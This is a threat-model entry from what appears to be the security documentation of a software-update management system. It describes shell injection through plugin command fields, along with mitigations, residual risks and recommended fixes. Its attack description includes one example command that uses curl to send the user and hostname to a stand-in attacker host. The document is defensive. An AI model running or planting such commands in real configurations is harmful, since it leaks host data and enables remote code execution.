# ATK-08: Shell Injection via Plugins

| Field | Value |
| --- | --- |
| Severity | High |
| Attack surface | Command execution (plugin system) |
| Prerequisites | Authenticated user with `manage_software` permission |
| STRIDE | Elevation of Privilege |

## Attack description

1. An attacker with `manage_software` API access creates a plugin config with a
   plugin type that supports arbitrary shell commands (e.g., `generic_shell`).
2. The attacker embeds malicious bash in the `version_command` or `update_command`
   field. For example:
   `"version_command": "curl http://attacker.com/$(whoami)@$(hostname) && echo 1.0"`
3. The plugin config is assigned to a software item on one or more managed hosts.
4. On the next scheduled version check or manual update trigger, the controller sends
   the command to the agent via `check_versions` or `execute_update`.
5. The agent executes the command via `bash -c "set -euo pipefail\n<command>"`,
   running the attacker's payload on the managed host.

The same attack applies to:

- **Docker plugin `post_pull_command`.** An arbitrary bash template that executes
  after a Docker image pull.
- **Custom hook commands.** The `pre_update_commands` and `post_update_commands`
  arrays in plugin configs accept arbitrary shell command strings with no content
  validation.
- **Structured hook custom commands.** The `hooks.pre_update.commands` and
  `hooks.post_update.commands` arrays similarly accept unvalidated shell strings.

## Worst-case impact

- **Remote code execution on managed hosts.** The attacker achieves arbitrary command
  execution on every host assigned to the affected software item.
- **Privilege escalation.** If the agent has sudo access (via sudoers drop-in), the
  attacker can escalate to root on managed hosts.
- **Lateral movement.** The attacker can use compromised hosts to attack other systems
  on the same network, install backdoors, or exfiltrate data.
- **Persistence.** Malicious commands can modify the host's crontab, systemd services,
  or SSH authorized_keys to maintain access even after the plugin config is corrected.

## Current mitigations

- **Authentication and authorization.** Plugin config writes require the
  `manage_software` permission. Only users with this permission can create or modify
  plugin configs.
- **Shell escape for dynamic values.** Plugin template substitution uses
  `shell_escape()` for dynamic values like `{package_identifier}`, `{version}`, and
  `{tag}`. An attacker cannot inject shell commands through these substitution
  variables.
- **`Exec` mode for structured commands.** `CommandSpec::exec()` uses direct process
  argv (no shell interpretation), preventing injection through arguments. Predefined
  hooks (systemd, docker-compose) use `Exec` mode exclusively.
- **Predefined hook validation.** Systemd service names are validated to
  `[a-zA-Z0-9._@:-]+`. Docker-compose paths are validated to `[a-zA-Z0-9._/ ~-]+`
  with no `..`. These validations prevent injection in structured hook fields.
- **Package identifier validation.** Every plugin validates `package_identifier` via
  a `validate_identifier()` function that enforces character whitelists and length
  bounds.
- **Version string validation.** Plugins that interpolate `to_version` into commands
  validate the version string (e.g., npm rejects `file:`, `git+`, `http:` prefixes;
  apt rejects leading `-`).
- **Agent runs as unprivileged user.** The agent runs as a non-root user with
  per-command sudoers entries, limiting the blast radius of command execution.

## Residual risk

- **Shell plugin commands are unvalidated by design.** The `generic_shell` plugin's
  `version_command` and `update_command` accept any shell command. This is intentional
  (the plugin's purpose is operator-supplied scripts), but it means
  `manage_software` permission is effectively equivalent to remote code execution.
- **Custom hook commands bypass all validation.** The `commands` array in both legacy
  and structured hook formats passes through without content inspection.
- **`post_pull_command` in Docker plugin is unvalidated.** The template string accepts
  any bash command. Validation only checks it is non-empty.
- **`manage_software` is a broad permission.** Users with this permission can modify
  any plugin config for any software item in their tenant, affecting all hosts
  assigned to those items.
- **SSH agent amplification.** For SSH-managed hosts, commands execute on remote
  machines via the SSH agent's connection pool. A single malicious plugin config can
  execute on many remote hosts.
- **No content audit trail.** While plugin config changes are stored in the database,
  there is no dedicated audit log that flags when command-bearing fields are modified,
  making it difficult to detect malicious changes.

## Recommended improvements

- Document explicitly in operator and security guides that `manage_software` grants
  effective RCE on all managed hosts and should be treated as a privileged
  administrative capability.
- Add an audit log entry when plugin configs with command-bearing fields
  (`version_command`, `update_command`, `post_pull_command`, hook commands) are
  created or modified, including the user who made the change.
- Consider a "command approval" workflow where plugin configs containing shell commands
  require a second admin's approval before taking effect.
- Implement a plugin config diff view in the UI that highlights changes to
  command-bearing fields, making it easier for admins to review modifications.
- Add an optional allowlist of permitted command prefixes or patterns per tenant,
  allowing operators to restrict which commands can be configured.

## References

- [Secure Development — Plugin Input Validation](../security/secure-development.md#plugin-input-validation)
- [Plugin Guidelines](../development/plugin-guidelines.md)
- [Update Hooks](../development/update-hooks.md)
- `crates/plugins/generic/shell/src/plugin.rs` — ShellPlugin command execution
- `crates/plugins/releases/docker/src/plugin.rs` — Docker post_pull_command
- `crates/shared/update-hooks/src/lib.rs` — hook resolution
- `crates/shared/command/src/command.rs` — `run_command_exec_impl()`,
  `run_command_with_shell()`
